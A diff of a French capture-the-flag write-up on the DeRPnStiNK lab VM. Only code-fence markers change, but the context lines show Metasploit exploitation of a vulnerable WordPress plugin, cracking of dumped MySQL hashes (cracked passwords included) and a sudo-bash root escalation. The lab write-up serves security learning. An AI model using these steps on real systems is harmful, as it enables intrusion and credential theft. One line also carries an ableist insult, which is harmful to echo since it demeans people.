@@ -12,7 +12,7 @@ Au final pas eu trop de bol sur ce CTF ce qui m'a pris plus de temps qu'il aurai
 Lamba: scan
 -----------
 
-```plain
+```
 Nmap scan report for 192.168.2.2
 Host is up (0.0022s latency).
 Not shown: 65532 closed ports
@@ -45,7 +45,7 @@ Pour peu que l'on sache scroller, on trouve le premier flag dans le code HTML de
 
 Avec un buster on trouve des dossiers supplémentaires dont ceux indiqués dans le *robots.txt* :  
 
-```plain
+```
 Starting buster processes...
 http://192.168.2.2/css/ - HTTP 403 (282 bytes, plain)
 http://192.168.2.2/icons/ - HTTP 403 (284 bytes, plain)
@@ -62,7 +62,7 @@ On trouve (via buster aussi) un fichier */php/info.php* vide et une install de p
 
 Dans la page d'index j'avais aussi remarqué une référence à une ressource *webnotes/info.txt* qui contient le message suivant :  
 
-```plain
+```
 @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live
 ```
 
@@ -132,7 +132,7 @@ Au passage le fichier *elidumfy.php* est bien présent sur le système et [sembl
 
 J'ai ensuite eu recours à *wpscan* pour avoir plus d'infos sur le Wordpress :  
 
-```plain
+```
 [+] Name: slideshow-gallery - v1.4.6
  |  Last updated: 2017-07-17T09:36:00.000Z
  |  Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
@@ -173,7 +173,7 @@ Au boût d'un moment j'ai rebooté la VM et cette fois la base de données étai
 
 J'ai donc re-importé la VM et tenté de casser les comptes Wordpress, cette fois avec *Metasploit* qui n'en a fait qu'une bouchée :  
 
-```plain
+```
 msf auxiliary(wordpress_login_enum) > exploit
 
 [*] /weblog/ - WordPress Version 4.6.9 detected
@@ -197,7 +197,7 @@ msf auxiliary(wordpress_login_enum) > exploit
 
 J'ai décidé de retenter ensuite avec *wpscan*... rien ! Comme quoi il ne faut jamais apporter trop de confiance aux outils qu'on utilise :p   
 
-```plain
+```
 msf exploit(wp_slideshowgallery_upload) > show options
 
 Module options (exploit/unix/webapp/wp_slideshowgallery_upload):
@@ -268,7 +268,7 @@ define('DB_HOST', 'localhost');
 
 Ce qui permet de dumper les hashs des utilisateurs MySQL :  
 
-```plain
+```
 mysql> select User, Password from user;
 +------------------+-------------------------------------------+
 | User             | Password                                  |
@@ -286,7 +286,7 @@ mysql> select User, Password from user;
 
 Avec hashcat on obtient les passwords pour *phpmyadmin* et surtout *unclestinky* (il faut retirer les astérisques dans le fichier des hashs) :  
 
-```plain
+```
 $ hashcat-cli64.bin -a 0 -m 300 hash.txt rockyou.txt
 4acfe3202a5ff5cf467898fc58aab1d615029441:admin
 9b776afb479b31e8047026f1185e952dd1e530cb:wedgie57
@@ -294,7 +294,7 @@ $ hashcat-cli64.bin -a 0 -m 300 hash.txt rockyou.txt
 
 On peut aussi passer par le phpMyAdmin avec les identifiants root, c'est plus agréable pour explorer et ainsi trouver le second flag dans les drafts (brouillons) du Wordpress :  
 
-```plain
+```
 flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
 ```
 
@@ -307,7 +307,7 @@ A l'écoute
 
 Dans le dossier personnel de l'utilisateur stinky on retrouve plusieurs fichiers d'intérêt :  
 
-```plain
+```
 .local/share/keyrings/login.keyring
 .local/share/keyrings/user.keystore
 .local/share/telepathy/mission-control/accounts.cfg
@@ -324,7 +324,7 @@ Le flag est le suivant : **flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d18
 
 Quand au contenu de *derpissues.txt* :  
 
-```plain
+```
 12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
 12:07 stinky: yeah. did you need a password reset?
 12:07 mrderp: I think i accidently deleted my account
@@ -356,7 +356,7 @@ Et pas que dans les arguments !
 
 *mrderp* dispose de plusieurs fichiers intéressants sur le système. L'un est */support/troubleshooting.txt* dont voici le contenu :  
 
-```plain
+```
 *******************************************************************
 On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.
 
@@ -378,7 +378,7 @@ Thank you for using our product.
 
 et l'autre *Desktop/helpdesk.log* dans son dossier personnel :  
 
-```plain
+```
 From: Help Desk <helpdesk@derpnstink.local>
 Date: Thu, Aug 23, 2017 at 1:29 PM
 Subject: sudoers ISSUE=242 PROJ=26
@@ -444,14 +444,14 @@ For more information, dont forget to visit the Self Help Web page!!!
 
 Pour l'attardé mental au fond de la classe ça veut dire qu'on doit faire un *sudo -l* pour voir ce qu'on est autorisé à lancer :  
 
-```plain
+```
 User mrderp may run the following commands on DeRPnStiNK:
     (ALL) /home/mrderp/binaries/derpy*
 ```
 
 Obtenir le root est aisé :  
 
-```plain
+```
 mrderp@DeRPnStiNK:~$ cp /bin/bash /home/mrderp/binaries/derpybash
 mrderp@DeRPnStiNK:~$ sudo /home/mrderp/binaries/derpybash -p
 root@DeRPnStiNK:~# id
@@ -460,7 +460,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 et le dernier flag :  
 
-```plain
+```
 root@DeRPnStiNK:/root# cat Desktop/flag.txt 
 flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
 
